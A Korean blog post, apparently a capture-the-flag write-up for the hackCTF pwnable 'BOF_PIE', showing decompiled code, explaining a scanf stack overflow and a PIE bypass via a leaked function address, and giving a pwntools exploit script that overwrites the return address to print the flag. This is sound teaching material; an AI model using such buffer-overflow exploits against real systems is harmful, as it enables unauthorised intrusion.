---
layout: post
title:  "[hackCTF]BOF_PIE"
date:   2020-02-18
categories: [hackCTF]
tags: [hackCTF]
permalink: '/hackCTF'
---

hackCTF pwnable 9번째 문제

![favicon](https://github.com/kkarung/kkarung.github.io/blob/master/assets/image/favicons.png?raw=true)

## ida - main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  welcome();
  puts("Nah...");
  return 0;
}
```

## ida - welcome
```c
int welcome()
{
  char v1; // [esp+6h] [ebp-12h]

  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  puts("Hello, Do you know j0n9hyun?");
  printf("j0n9hyun is %p\n", welcome);
  return _isoc99_scanf("%s", &v1);
}
```

## ida - j0n9hyun
```c
void j0n9hyun()
{
  char s; // [esp+4h] [ebp-34h]
  FILE * stream; // [esp+2Ch] [ebp-Ch]

  puts("ha-wi");
  stream = fopen("flag", "r");
  if ( stream )
  {
    fgets(&s, 40, stream);
    fclose(stream);
    puts(&s); // flag 출력
  }
  else
  {
    perror("flag");
  }
}
```
welcome함수 scanf에서 ret까지 덮어 j0n9hyun 함수를 실행시키면 될 것 같다.<br><br>
![0901](https://github.com/kkarung/kkarung.github.io/blob/master/assets/image/hackCTF/0901.JPG?raw=true)  
PIE가 걸려 있고 파일을 실행시키면 welcome 함수의 주소를 제공하므로 j0n9hyun 함수의 정확한 주소를 구할 수 있다.  
j0n9hyun 함수의 주소 = welcome 함수의 주소 + (j0n9hyun offset - welcome offset)
<br>

정리해보자.<br><br>
목표 : welcome 함수의 ret을 덮어 j0n9hyun 함수 실행시키기<br>
취약점 : _isoc99_scanf("%s", &v1)<br><br><br>


## exploit.py
```python
#!/usr/bin/python
from pwn import *

p = remote('ctf.j0n9hyun.xyz', 3008)

p.recvuntil("j0n9hyun is ")

welcome = int(p.recv(10), 16)

offset = 0x890-0x909

payload = "A"*0x16+p32(welcome+offset)

p.sendline(payload)

p.interactive()
```

## 결과
![0902](https://github.com/kkarung/kkarung.github.io/blob/master/assets/image/hackCTF/0902.JPG?raw=true)
